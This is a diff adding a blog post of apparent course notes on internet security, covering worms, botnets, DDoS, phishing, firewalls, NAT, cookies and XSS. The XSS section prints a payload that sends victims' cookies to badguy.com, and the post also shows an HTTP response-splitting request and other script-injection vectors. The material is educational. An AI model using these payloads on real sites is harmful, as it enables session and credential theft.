@@ -253,6 +253,684 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/10/Internet Security Notes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jiangfeng Du">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="迷雾">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/10/Internet Security Notes/" itemprop="url">Internet Security Notes</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-10T15:12:57+02:00">
+                2017-07-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Security is about protecting assets. It involves Prevention, Detection, Reaction.</p>
+<p>Confidentiality: prevent unauthorized disclosure of information.<br>Integrity: prevent unauthorized modification of information.<br>Availability: prevent unauthorized withholding of information.</p>
+<h2 id="Worms"><a href="#Worms" class="headerlink" title="Worms"></a>Worms</h2><p>A worm is <em>self-replicating software</em> designed to spread through the network.</p>
+<ul>
+<li>Typically exploits security flaws in widely used services</li>
+<li>Can launch DDOS attacks, install Botnets</li>
+<li>Access sensitive information</li>
+</ul>
+<p>A virus is code embedded in a file or program.</p>
+<p>Viruses and Trojan <code>[&#39;trodʒən]</code>horses rely on human intervention.</p>
+<p>Worms are self-contained.</p>
+<h3 id="The-UCSD-Network-Telescope"><a href="#The-UCSD-Network-Telescope" class="headerlink" title="The UCSD Network Telescope"></a>The UCSD Network Telescope</h3><p>A Real-time Monitoring System for Tracking Internet Attacks</p>
+<p>A way to observe global network phenomena with only local monitoring.</p>
+<p><strong>Since Quantitative attack data isn’t available.</strong></p>
+<p>Key observation: large class of attacks use random addresses.</p>
+<ul>
+<li>Worm’s frequently select new host to infect at random</li>
+<li>Many DoS attacks hide their source by randomizing source addresses.</li>
+</ul>
+<p><strong>Network Telescope</strong></p>
+<ul>
+<li>A monitor that records packets sent to a large range of unused Internet addresses.</li>
+</ul>
+<p>Example: Monitoring Denial-of-Service Attacks</p>
+<ol>
+<li>Attacker floods the victim with requests using <em>random spoofed source IP addresses</em>.</li>
+<li>Victim believes requests are legitimate and responds to each spoofed address.</li>
+<li>Network telescope can infer that <em>a site sending unsolicited reply packets</em> is being attacked.</li>
+</ol>
+<p>We have access to more than 1/256 of all Internet addresses (&gt; 16M IP addresses).</p>
+<p>How do worms propagate?</p>
+<ul>
+<li>Scanning worms (Worm chooses “random” address)</li>
+<li>Coordinated scanning (Different worm instances scan different addresses)</li>
+<li>Flash worms (Preassemble tree of vulnerable hosts, propagate along tree)</li>
+<li>Meta-server worm (Contact server for hosts list(e.g., Google for “powered by phpbb”))</li>
+<li>Topological worm (Use information from infected hosts (web server logs, email address books, config files, SSH “known hosts”))</li>
+<li>Contagion worm (Propagate parasitically along with normal communication)</li>
+</ul>
+<h3 id="Defenses"><a href="#Defenses" class="headerlink" title="Defenses"></a>Defenses</h3><ol>
+<li>Detect via <strong>honeyfarms</strong>: Collections of “<strong>honeypots</strong>” fed by a network telescope.</li>
+</ol>
+<ul>
+<li>Any outbound connection from honeyfarm = worm.</li>
+<li>Distill signature from inbound/outbound traffic.</li>
+</ul>
+<ol>
+<li>Thwart via scan suppressors: network elements that block traffic from hosts that make failed connection attempts to too many other hosts.</li>
+</ol>
+<p>Honeypot</p>
+<blockquote>
+<p>A honeypot is a <em>faked</em> vulnerable system used for the purpose of being attacked, probed, exploited and<br>compromised.</p>
+<p>IDS (Intrusion Detection System)</p>
+</blockquote>
+<p>Classification</p>
+<ul>
+<li>High-interaction honeypots<ul>
+<li>A full and working OS is provided for being attacked</li>
+<li>VMware virtual environment (Several VMware virtual hosts in one physical machine)</li>
+</ul>
+</li>
+<li>Low-interaction honeypots<ul>
+<li>Only emulate specific network services</li>
+<li>No real interaction or OS</li>
+</ul>
+</li>
+<li>Honeynet/honeyfarm (A network of honeypots)<ul>
+<li>Low-interaction honeynet (Emulate a virtual network in one physical machine)</li>
+</ul>
+</li>
+</ul>
+<p>Broader view of defenses</p>
+<p>Prevention – make the monoculture (单一栽培) hardier</p>
+<ul>
+<li>Get the darn code right in the first place</li>
+<li>Lots of active research (static &amp; dynamic methods)</li>
+<li>Security reviews now taken seriously by industry</li>
+</ul>
+<p>Prevention – diversify the monoculture</p>
+<ul>
+<li>Via exploiting existing heterogeneity</li>
+<li>Via creating artificial heterogeneity</li>
+<li>Prevention – keep vulnerabilities inaccessible</li>
+<li>Detection – look for unusual repeated content</li>
+</ul>
+<p>Once you have a live worm, then what?</p>
+<ul>
+<li>Containment<ul>
+<li>Use distilled signature to prevent further spread</li>
+</ul>
+</li>
+<li>Proof of infection<ul>
+<li>Idea: alerts come with a verifiable audit trail that demonstrates the exploit, ala’ proof-carrying code</li>
+</ul>
+</li>
+<li>Auto-patching</li>
+<li>Auto-antiworm<ul>
+<li>Techniques to automatically derive a new worm from a propagating one, but with disinfectant payload.</li>
+</ul>
+</li>
+</ul>
+<h2 id="Botnets"><a href="#Botnets" class="headerlink" title="Botnets"></a>Botnets</h2><p>Botnet could be a most powerful supercomputer in the world.</p>
+<p>Botnet = network of autonomous programs capable of acting on instructions.</p>
+<ul>
+<li>Typically a large (up to several hundred thousand) group of remotely controlled “zombie” systems</li>
+<li>Machine owners are not aware they have been compromised</li>
+<li>Controlled and upgraded via IRC/P2P/HTTP/…</li>
+</ul>
+<p>Used as the platform for various attacks</p>
+<ul>
+<li>Distributed denial of service</li>
+<li>Spam and click fraud</li>
+<li>Launching pad for new exploits/worms</li>
+</ul>
+<h4 id="Botnet-construction"><a href="#Botnet-construction" class="headerlink" title="Botnet construction"></a>Botnet construction</h4><p>First stage, exploit vulnerabilities (operating system’s/browser’s)</p>
+<p>Next stage to download bot software, C&amp;C instructions. (Command and Control)</p>
+<p>Once the bot software is executed and connected to C&amp;C server.</p>
+<ul>
+<li>Bots connect to channel of C&amp;C (IRC or HTTP) password protected channel (IRC: Internet Relay Chat)</li>
+<li>Encryption layer between bot and C&amp;C</li>
+</ul>
+<h4 id="Fast-Flux-service-networks"><a href="#Fast-Flux-service-networks" class="headerlink" title="Fast-Flux service networks"></a>Fast-Flux service networks</h4><ul>
+<li>A technique in which A and NS records of a domain change rapidly</li>
+<li>Location (IP) of the domain changes rapidly when resolved</li>
+<li>Used for load balancing across servers, resource configuration, etc…</li>
+<li>Bot herders effectivly use it to hide mothership</li>
+</ul>
+<h4 id="Propagation"><a href="#Propagation" class="headerlink" title="Propagation"></a>Propagation</h4><p>Each bot can scan IP space for new victims</p>
+<ul>
+<li>Automatically</li>
+<li>On-command: Target specific /8 or /16 prefixes (Botmasters share information about prefixes to avoid).</li>
+</ul>
+<p>DoS</p>
+<p>Goal: Overwhelm victim machine and deny service to its legitimate clients.</p>
+<p>DoS often exploits networking protocols</p>
+<ul>
+<li>Smurf: ICMP echo request to broadcast address with spoofed victim’s address as source</li>
+<li>Ping of death: ICMP packets with payloads greater than 64K crash older versions of Windows</li>
+<li>SYN flood: “Open TCP connection” request from a spoofed address</li>
+<li>UDP flood: Exhaust bandwidth by sending thousands of bogus UDP packets</li>
+</ul>
+<p>DDos</p>
+<p>Build a botnet of zombies</p>
+<p>Command zombies to stage a coordinated attack on the victim</p>
+<ul>
+<li>Does not require spoofing.</li>
+<li>Even in case of SYN flood, SYN cookies don’t help.</li>
+</ul>
+<p>Overwhelm victim with traffic arriving from thousands of different sources.</p>
+<p>DDoS Tools: Trin00</p>
+<p>Send commands (victim IP, attack parameters), using plaintext passwords for authentication</p>
+<ul>
+<li>Attacker to master: TCP, master to zombie: UDP</li>
+</ul>
+<p>DDoS Tools: Tribal Flood Network</p>
+<p>Attacker runs masters directly via root backdoor; masters talk to zombies using ICMP echo reply</p>
+<ul>
+<li>No authentication of master’s commands, but commands are encoded as 16-bit binary numbers inside ICMP packets to prevent accidental triggering</li>
+</ul>
+<p>List of zombie daemons’ IP addresses is encrypted in later versions of TFN master scripts</p>
+<ul>
+<li>Protects identities of zombies if master is discovered</li>
+</ul>
+<p>DDoS Tools: Stacheldraht</p>
+<p>Combines “best” features of Trin00 and TFN</p>
+<p>Symmetric encryption for attacker-master connections.</p>
+<h3 id="Spam"><a href="#Spam" class="headerlink" title="Spam"></a>Spam</h3><h4 id="Email-spoofing"><a href="#Email-spoofing" class="headerlink" title="Email spoofing"></a>Email spoofing</h4><ul>
+<li>Mail is sent via SMTP protocol (No built-in authentication)</li>
+<li>MAIL FROM field is set by the sender</li>
+<li>Recipient’s mail server only sees IP address of the direct peer from whom it received the msg</li>
+</ul>
+<h4 id="Open-relays"><a href="#Open-relays" class="headerlink" title="Open relays"></a>Open relays</h4><p>SMTP relay forwards mail to destination</p>
+<ul>
+<li>Bulk email tool connects via SMTP (port 25)</li>
+<li>Sends list of recipients via RCPT TO command</li>
+<li>Sends email body (once for all recipients!)</li>
+<li>Relay delivers message</li>
+</ul>
+<p>Honest relay adds correct Received: header revealing source IP.</p>
+<p>Hacked relay does not.</p>
+<p>Reason:</p>
+<p>Real-time blackhole lists stop 15-25% of spam at SMTP connection time.</p>
+<ul>
+<li>Over 90% after message body URI checks</li>
+</ul>
+<p>Spammers’ objective: evade blacklists</p>
+<ul>
+<li>Botnets come very handy!</li>
+</ul>
+<p>Spam via Open HTTP proxies.</p>
+<p>Spammer must send message to each recipient through the proxy.</p>
+<h4 id="Detecting-Botnets"><a href="#Detecting-Botnets" class="headerlink" title="Detecting Botnets"></a>Detecting Botnets</h4><p>Today’s bots are controlled via IRC and DNS.</p>
+<ul>
+<li>IRC used to issue commands to zombies</li>
+<li>DNS used by zombies to find the master, and by the master to find if a zombie has been blacklisted</li>
+</ul>
+<p>IRC/DNS activity is very visible in the network</p>
+<ul>
+<li>Look for hosts performing scans, and for IRC channels with a high percentage of such hosts</li>
+<li>Look for hosts who ask many DNS queries, but receive few queries about themselves</li>
+</ul>
+<p>Easily evaded by using encryption and P2P.</p>
+<hr>
+<h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><h4 id="Classic-Denial-of-Service-Attacks"><a href="#Classic-Denial-of-Service-Attacks" class="headerlink" title="Classic Denial of Service Attacks"></a>Classic Denial of Service Attacks</h4><ul>
+<li>can use simple flooding ping</li>
+<li>from higher capacity link to lower</li>
+<li>causing loss of traffic</li>
+<li>source of flood traffic easily identified</li>
+</ul>
+<h4 id="Source-Address-Spoofing"><a href="#Source-Address-Spoofing" class="headerlink" title="Source Address Spoofing"></a>Source Address Spoofing</h4><ul>
+<li>use forged source addresses</li>
+<li>generate large volumes of packets</li>
+<li>cause same congestion</li>
+<li>responses are scattered across Internet</li>
+<li>real source is much harder to identify</li>
+</ul>
+<h4 id="Types-of-Flooding-Attacks"><a href="#Types-of-Flooding-Attacks" class="headerlink" title="Types of Flooding Attacks"></a>Types of Flooding Attacks</h4><p>Classified based on network protocol used</p>
+<ul>
+<li>ICMP Flood (uses ICMP packets, eg echo request) ( typically allowed through, some required)</li>
+<li>UDP Flood (alternative uses UDP packets to some port)</li>
+<li>TCP SYN Flood</li>
+</ul>
+<h4 id="Reflection-Attacks"><a href="#Reflection-Attacks" class="headerlink" title="Reflection Attacks"></a>Reflection Attacks</h4><ul>
+<li>Attacker sends packet with spoofed source address being that of target to a server</li>
+<li>Server response is directed at target</li>
+<li>If send many requests to multiple servers, response can flood target</li>
+<li>ideally want response larger than request</li>
+</ul>
+<p>DNS Amplification Attacks</p>
+<ul>
+<li>use DNS requests with spoofed source address being the target</li>
+<li>exploit DNS behavior to convert a small request to a much larger response (60 byte request to 512 - 4000 byte response)</li>
+<li>attacker sends requests to multiple well connected servers, which flood target</li>
+</ul>
+<h4 id="DoS-Attack-Defenses"><a href="#DoS-Attack-Defenses" class="headerlink" title="DoS Attack Defenses"></a>DoS Attack Defenses</h4><p>three lines of defense against (D)DoS:</p>
+<ul>
+<li>attack prevention and preemption</li>
+<li>attack detection and filtering</li>
+<li>attack source traceback and identification</li>
+</ul>
+<p>Attack Prevention</p>
+<ul>
+<li>block spoofed source addresses (still far too rarely implemented)</li>
+<li>rate controls in upstream distribution nets<ul>
+<li>on specific packets types</li>
+<li>e.g. some ICMP, some UDP, TCP/SYN</li>
+</ul>
+</li>
+<li>use modified TCP connection handling<ul>
+<li>use SYN cookies when table full</li>
+<li>or selective or random drop when table full</li>
+</ul>
+</li>
+<li>block IP directed broadcasts</li>
+<li>block suspicious services &amp; combinations</li>
+<li>manage application attacks with “puzzles” to distinguish legitimate human requests</li>
+<li>use mirrored and replicated servers when high performance and reliability required</li>
+</ul>
+<p>Responding to Attacks</p>
+<ul>
+<li>ideally have network monitors and IDS<ul>
+<li>to detect and notify abnormal traffic patterns</li>
+</ul>
+</li>
+<li>have standard filters</li>
+<li>identify type of attack<ul>
+<li>capture and analyze packets</li>
+<li>design filters to block attack traffic upstream</li>
+<li>or identify and correct system/application bug</li>
+</ul>
+</li>
+<li>have ISP trace packet flow back to source</li>
+</ul>
+<hr>
+<h2 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h2><p>Spoofed emails</p>
+<h3 id="Phishing-techniques"><a href="#Phishing-techniques" class="headerlink" title="Phishing techniques"></a>Phishing techniques</h3><ul>
+<li>Use confusing URLs</li>
+<li>Use URL with multiple redirection</li>
+<li>Host phishing sites on botnet zombies<ul>
+<li>Move from bot to bot using dynamic DNS</li>
+</ul>
+</li>
+</ul>
+<p>Pharming</p>
+<ul>
+<li>Poison DNS tables so that victim’s address (e.g., www.paypal.com) points to the phishing site</li>
+<li>URL checking doesn’t help!</li>
+</ul>
+<p>HTTP response splitting</p>
+<p>Malicious user requests</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://.../by_lang.jsp ? lang=</div><div class="line">				“french \n</div><div class="line">				Content-length: 0 \r\n\r\n</div><div class="line">				HTTP/1.1 200 OK</div><div class="line">				&lt;Encoded URL of phishing page&gt;”</div></pre></td></tr></table></figure>
+<p>Server responds:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302</div><div class="line">Date: …</div><div class="line">` 		Location: /by_lang.jsp ? lang= french</div><div class="line">		Content-length: 0</div><div class="line">		HTTP/1.1 200 OK</div><div class="line">		Content-length: 217  Looks like a separate page</div><div class="line">		Phishing page</div></pre></td></tr></table></figure>
+<p>Attacker submitted a URL to victim.com.</p>
+<p>Response from victim.com contains phishing page.</p>
+<p>All cache servers along the path will store the phishing page as the cache of victim.com.</p>
+<p>If an unsuspecting user of the same cache server requests victim.com, server will give him the cached phishing page instead.</p>
+<h3 id="Trusted-input-path-problem"><a href="#Trusted-input-path-problem" class="headerlink" title="Trusted input path problem"></a>Trusted input path problem</h3><p>Users are easily tricked into entering passwords into insecure non-password fields.</p>
+<p>Sends keystroke to phisher.</p>
+<p>Defense #1: Internet Explorer 7.0</p>
+<p> “White list” of trusted sites</p>
+<p>Defense #2: PassMark / SiteKey</p>
+<p>Defense #3: PIN Guard</p>
+<p>Use your mouse to click the number.</p>
+<p>Defense #3A: Scramble Pad</p>
+<p>Defense #4: Virtual Keyboard</p>
+<p>Passport services</p>
+<p><img src="/image/IS/Passport service.PNG" alt="Passport service"></p>
+<p>Idea: authenticate once, use everywhere.</p>
+<p>Trusted third party issues identity credentials.</p>
+<p>User uses them to access services over the Web.</p>
+<h3 id="Liberty-Alliance"><a href="#Liberty-Alliance" class="headerlink" title="Liberty Alliance"></a>Liberty Alliance</h3><p>Open-standard alternative to Passport</p>
+<p>Promises compliance with privacy legislation</p>
+<p>Long list of Liberty-enabled products</p>
+<p>As of June 2009, work has been transfered to Kantara Initiative.</p>
+<h3 id="Defenses-1"><a href="#Defenses-1" class="headerlink" title="Defenses"></a>Defenses</h3><p>Use mutual authentication</p>
+<p>Non-Reusable credentials</p>
+<p>Basic technical mechanism available</p>
+<hr>
+<h2 id="Spam-analytics"><a href="#Spam-analytics" class="headerlink" title="Spam analytics"></a>Spam analytics</h2><p>Three main cost factors:</p>
+<p>Retail cost to send <em> conversion rate </em> sale profit</p>
+<p>Crucial step: infiltration.</p>
+<h3 id="Mission-Spam-Conversion"><a href="#Mission-Spam-Conversion" class="headerlink" title="Mission: Spam Conversion"></a>Mission: Spam Conversion</h3><p>Infiltrate Storm at proxy level</p>
+<p>rewrite spam instructions to use our own URLs</p>
+<p>… where we run our own websites and observe activity at each stage.</p>
+<p>We get rates for SMTP delivery, spam filtering, click-through, and final conversion.</p>
+<p> Conversion rates:</p>
+<ul>
+<li>1-in-12M for pharmaceuticals</li>
+<li>1-in-200K for voluntary executions</li>
+<li>1-in-10 for website visitors</li>
+</ul>
+<hr>
+<h2 id="Firewalls-and-NAT"><a href="#Firewalls-and-NAT" class="headerlink" title="Firewalls and NAT"></a>Firewalls and NAT</h2><p>Firewalls: isolates organization’s internal net from larger Internet, allowing some packets to pass, blocking others.</p>
+<h3 id="Goals"><a href="#Goals" class="headerlink" title="Goals:"></a>Goals:</h3><ul>
+<li>All traffic from outside to inside and vice-versa passes through the firewall.</li>
+<li>Only authorized traffic, as defined by local security policy, will be allowed to pass.</li>
+<li>Firewall itself is immune to penetration</li>
+</ul>
+<h3 id="Taxonomy"><a href="#Taxonomy" class="headerlink" title="Taxonomy"></a>Taxonomy</h3><ul>
+<li>Traditional packet filters (Filters often combined with router, creating a firewall)</li>
+<li>Stateful filters</li>
+<li>Application gateways</li>
+</ul>
+<p>Firewall == system that filters TCP/IP UDP/IP packets according to rules.</p>
+<p>Either software on user machine or network router.</p>
+<h4 id="Traditional-packet-filters"><a href="#Traditional-packet-filters" class="headerlink" title="Traditional packet filters"></a>Traditional packet filters</h4><p>Analyzes each datagram going through it; makes drop decision based on:</p>
+<p>Src IP addr, Dst IP addr, Src Port, Dst Port, TCP flag bits,</p>
+<p>TCP or UDP or ICMP (Firewalls often configured to block all UDP),</p>
+<p>Direction, Router interface(Decisions can be different for different interfaces).</p>
+<p>Filtering rules (example)</p>
+<p><img src="/image/IS/Filtering Rules.PNG" alt="Filtering Rules"></p>
+<p>Access control lists: (Apply rules from top to bottom)</p>
+<p><img src="/image/IS/Access control list.PNG" alt="Access control list"></p>
+<p>Each router/firewall <strong>interface</strong> can have its own ACL.</p>
+<p>Most firewall vendors provide both command-line and graphical configuration interface.</p>
+<p>Disadvantages:</p>
+<ul>
+<li>Can be penetrated</li>
+<li>Cannot enforce some policies. For example, permit certain users.</li>
+<li>Rules can get complicated and difficult to test</li>
+</ul>
+<p>Iptables - chain types:</p>
+<ul>
+<li>INPUT chain</li>
+<li>OUTPUT chain</li>
+<li>FORWARD chain</li>
+</ul>
+<p>Example command</p>
+<p>iptables –A INPUT –i eth0 –s 232.16.4.0/24 –j ACCEPT</p>
+<p>Append (add rules to the bottom), -interface, -source.</p>
+<h3 id="Stateful-filters"><a href="#Stateful-filters" class="headerlink" title="Stateful filters"></a>Stateful filters</h3><p>Stateless filters: Any packet with ACK=1 and source port 80 gets through.</p>
+<ul>
+<li>Attack with malformed packets: send ACK=1 segments</li>
+</ul>
+<p>Stateful filter: Adds more intelligence to decision-making process.</p>
+<ul>
+<li>Stateful = remember past packets</li>
+<li>Needs very dynamic state table</li>
+</ul>
+<p>Example:</p>
+<p>Log each TCP connection initiated through firewall: SYN segment.</p>
+<p>Rule table indicates check of stateful table:<br>See if there is a connection entry in stateful table</p>
+<p>Stateful filters can remember outgoing UDP segments.</p>
+<h3 id="Application-gateways"><a href="#Application-gateways" class="headerlink" title="Application gateways"></a>Application gateways</h3><p> (aka proxy servers)</p>
+<p>User and server talk through proxy.</p>
+<p>Allows fine grained/ sophisticated control.</p>
+<p>Hinders protocol attacks.</p>
+<p>Example: Local mail servers (Virus detection and removal) and proxy Web servers.</p>
+<p>Advantages:</p>
+<p>Can log all connections, activity in connections</p>
+<p>Can provide caching</p>
+<p>Can do intelligent filtering based on “content”</p>
+<p>Simplifies service control</p>
+<ul>
+<li>Can perform user level authentication</li>
+<li>Simplifies firewall rules</li>
+</ul>
+<p>Disadvantages:</p>
+<p>Not all services have proxied versions (Need different proxy server for each service)</p>
+<p>Requires modification of client</p>
+<p>Performance</p>
+<p>Hinders end-to-end encryption</p>
+<h3 id="IP-traceback"><a href="#IP-traceback" class="headerlink" title="IP traceback"></a>IP traceback</h3><h4 id="Methods-for-finding-source"><a href="#Methods-for-finding-source" class="headerlink" title="Methods for finding source"></a>Methods for finding source</h4><ol>
+<li>Manual using current IP routing.</li>
+</ol>
+<p>Link testing:</p>
+<ul>
+<li>Start from victim and test upstream links</li>
+<li>Recursively repeat until source is located</li>
+<li>Assume attack remains active until trace complete</li>
+</ul>
+<p>Problem:</p>
+<ul>
+<li>Handle ISPs, Located zombie.</li>
+</ul>
+<p>Logging</p>
+<ul>
+<li><p>Key routers log packets (useful for forensics)</p>
+</li>
+<li><p>Use data mining to find path</p>
+</li>
+</ul>
+<ol>
+<li>Automatic using marking algorithms</li>
+</ol>
+<ul>
+<li>Mark packets with router addresses</li>
+<li>Trace attack using marked packets</li>
+</ul>
+<p>Assumption: Route from attacker to victim remains relatively stable.</p>
+<h3 id="Network-address-translation-NAT"><a href="#Network-address-translation-NAT" class="headerlink" title="Network address translation (NAT)"></a>Network address translation (NAT)</h3><p>Also known as Network masquerading, IP masquerading.</p>
+<h4 id="TURN-protocol"><a href="#TURN-protocol" class="headerlink" title="TURN protocol"></a>TURN protocol</h4><p>Traversal Using Relays around NAT</p>
+<p>Protocol for UDP/TCP relaying behind NAT</p>
+<p>Data is bounced to a public TURN server</p>
+<p>No hole punching (Technique to allow traffic from/to a host behind a firewall/NAT without collaboration of the NAT itself)</p>
+<p>TURN works even behind symmetric NAT</p>
+<h4 id="NAT-traversal-Cooperating-NAT"><a href="#NAT-traversal-Cooperating-NAT" class="headerlink" title="NAT traversal: Cooperating NAT"></a>NAT traversal: Cooperating NAT</h4><h5 id="SOCKS"><a href="#SOCKS" class="headerlink" title="SOCKS"></a>SOCKS</h5><p>Client server protocol </p>
+<p>Enables client (behind firewall) to use server (in public Internet)</p>
+<p>Relays traffic</p>
+<p>Widely adopted</p>
+<h4 id="NAT-traversal-UPnP"><a href="#NAT-traversal-UPnP" class="headerlink" title="NAT traversal: UPnP"></a>NAT traversal: UPnP</h4><p>Defines: Internet Gateway Device (IGD) protocol<br>Enables:<br>❍ Learning of ones public (external) IP address<br>❍ Enumeration of existing port mappings<br>❍ Adding and removing port mappings<br>❍ Assigning lease times to mappings<br>❍ Applications to automatically configure NAT routing</p>
+<hr>
+<h2 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h2><h3 id="Common-Vulnerabilities"><a href="#Common-Vulnerabilities" class="headerlink" title="Common Vulnerabilities"></a>Common Vulnerabilities</h3><p>XSS – Cross-site scripting</p>
+<p>Bad web site sends innocent victim a script that steals information from an honest web site.</p>
+<p>CSRF – Cross-site request forgery</p>
+<p>Bad website sends request to good website, using credentials of an innocent victim who “visits” site.</p>
+<p>SQL Injection</p>
+<p>Browser sends malicious input to server.</p>
+<p>Bad input checking leads to malicious SQL query.</p>
+<h3 id="Cookie-Same-Origin-Policy"><a href="#Cookie-Same-Origin-Policy" class="headerlink" title="Cookie Same Origin Policy"></a>Cookie Same Origin Policy</h3><p>DOM (Document Object Model)</p>
+<p>Web application servers are generally “stateless”.</p>
+<p>Statelessness causes problems for application developers: need to tie together a series of requests from the same user.</p>
+<hr>
+<p>The server creates a unique identifier, and returns a Set-Cookie: header in the response that contains the identifier.</p>
+<p>In the future when the browser connects with the same server, it includes a Cookie:</p>
+<p>header containing the identifier, which the server can use to connect related requests.</p>
+<hr>
+<p>What’s in a cookie?</p>
+<p>Name and data.</p>
+<p>A server can define multiple cookies with different names, but browsers limit the number of cookies per server (around 50).</p>
+<p>Web server maintains a collection of sessions.</p>
+<p>Each session is a pool of data related to an active connection (one browser instance).</p>
+<p>Typically the cookie for an application contains an identifier for a session.</p>
+<hr>
+<p>Today: Same Original Policy (SOP) for cookies:<br>Generally speaking, based on: ([scheme](optional), domain, path)</p>
+<p><code>scheme://domain:port/path?params</code></p>
+<p>Scope setting rules</p>
+<p>Default scope is domain and path of setting URL.</p>
+<p><u>domain</u>: any domain-suffix of URL-hostname, except TLD(Top-level Domain)</p>
+<p>allowed domains: login.site.com, .site.com.</p>
+<p>disallowed domains: user.site.com, othersite.com, .com.</p>
+<p>login.site.com can set cookies for all of .site.com but not for another site or TLD.</p>
+<p><u>path</u>: can be set to anything</p>
+<p>Cookies are identified by <u>(name,domain,path)</u>.</p>
+<hr>
+<p>Reading cookies on server (read SOP)</p>
+<p>GET //URL-domain/URL-path  Cookie: NAME = VALUE</p>
+<p>Browser sends all cookies in URL scope:</p>
+<ul>
+<li>cookie-domain is domain-suffix of URL-domain, and</li>
+<li>cookie-path is prefix of URL-path, and</li>
+<li>[protocol=HTTPS if cookie is “secure”]</li>
+</ul>
+<p>Goal: server only sees cookies in its scope.</p>
+<hr>
+<h4 id="Cookie-protocol-problems"><a href="#Cookie-protocol-problems" class="headerlink" title="Cookie protocol problems"></a>Cookie protocol problems</h4><p>Server is blind:</p>
+<p>Does not see cookie attributes (e.g. secure).<br>Does not see which domain set the cookie.</p>
+<p>Server only sees: Cookie: NAME=VALUE.</p>
+<p>Example 1: login server problems</p>
+<p>Problem: cs142hw expects session-id from login.site.com; <u>cannot tell that session-id cookie was overwritten</u>.</p>
+<p>Example 2: “secure” cookies are not secure</p>
+<p>Alice visits <code>http://www.google.com</code> (cleartext)<br>Network attacker can inject into response.</p>
+<p>​    <em>Set-Cookie: LSID=badguy; secure</em><br>and overwrite secure cookie.</p>
+<p>Problem: network attacker can re-write HTTPS cookies!</p>
+<p>HTTPS cookie value cannot be trusted.</p>
+<p><u>Cookies have no integrity !!</u></p>
+<p>Solution: cryptographic checksums.</p>
+<p>Goal: data integrity.<br>Requires secret key k unknown to browser</p>
+<hr>
+<p>Cookie theft: basic cross site scripting (XSS).</p>
+<p><img src="/image/IS/Reflective XSS attack.PNG" alt="Reflective XSS attack"></p>
+<p>Bad input</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://victim.com/search.php ? term =</div><div class="line">&lt;script&gt; window.open(</div><div class="line">“http://badguy.com?cookie = ” +</div><div class="line">document.cookie ) &lt;/script&gt;</div></pre></td></tr></table></figure>
+<p>What if user clicks on this link?</p>
+<ol>
+<li>Browser goes to victim.com/search.php</li>
+<li>Victim.com returns<br><code>&lt;HTML&gt; Results for &lt;script&gt; … &lt;/script&gt;</code></li>
+<li>Browser executes script: Sends badguy.com cookie for victim.com</li>
+</ol>
+<p>An XSS vulnerability is present when an attacker can inject scripting code into pages generated by a web application.</p>
+<p>Methods for injecting malicious code:</p>
+<ul>
+<li>Reflected XSS (“type 1”)<ul>
+<li>the attack script is reflected back to the user as part of a page from the victim site.</li>
+</ul>
+</li>
+<li>Stored XSS (“type 2”)<ul>
+<li>the attacker stores the malicious code in a resource managed by the web application, such as a database.</li>
+</ul>
+</li>
+</ul>
+<p>other ways:</p>
+<ul>
+<li>can do Javascript within CSS tags</li>
+</ul>
+<p><code>&lt;div style=“background:url(‘javascript:alert(1)’)”&gt;</code></p>
+<p>And can hide “javascript” as “java\nscript”.</p>
+<ul>
+<li>Stored XSS using images</li>
+</ul>
+<p>Attacker uploads an “image” that is a script.</p>
+<hr>
+<p>How to Protect Yourself</p>
+<p>The best way to protect against XSS attacks:</p>
+<ul>
+<li>Ensure that your app validates all headers, cookies, query strings, form fields, and hidden fields (i.e., all parameters) against a rigorous specification of what should be allowed.</li>
+<li>Do not attempt to identify active content and remove, filter, or sanitize it. (too many types)</li>
+<li>We strongly recommend a ‘positive’ security policy that <u>specifies what is allowed.</u> </li>
+</ul>
+<p>ASP.NET output filtering</p>
+<p>validateRequest: (on by default)</p>
+<ul>
+<li>Crashes page if finds <code>&lt;script&gt;</code> in POST data.</li>
+<li>Looks for hardcoded list of patterns</li>
+<li>Can be disabled: &lt;%@ Page validateRequest=“false” %&gt;</li>
+</ul>
+<p>Caution: Scripts not only in \<script>!</p>
+<p> JavaScript as scheme in URI</p>
+<ul>
+<li><code>&lt;img src=“javascript:alert(document.cookie);”&gt;</code></li>
+</ul>
+<p>JavaScript On{event} attributes (handlers)</p>
+<h4 id="Client-side-XSS-defenses"><a href="#Client-side-XSS-defenses" class="headerlink" title="Client-side XSS defenses"></a>Client-side XSS defenses</h4><p>Proxy-based: analyze the HTTP traffic exchanged between user’s web browser and the target web server by scanning for special HTML characters and encoding them.</p>
+<p>Application-level firewall: analyze browsed HTML pages for hyperlinks that might lead to leakage of sensitive information and stop bad requests using a set of connection rules.</p>
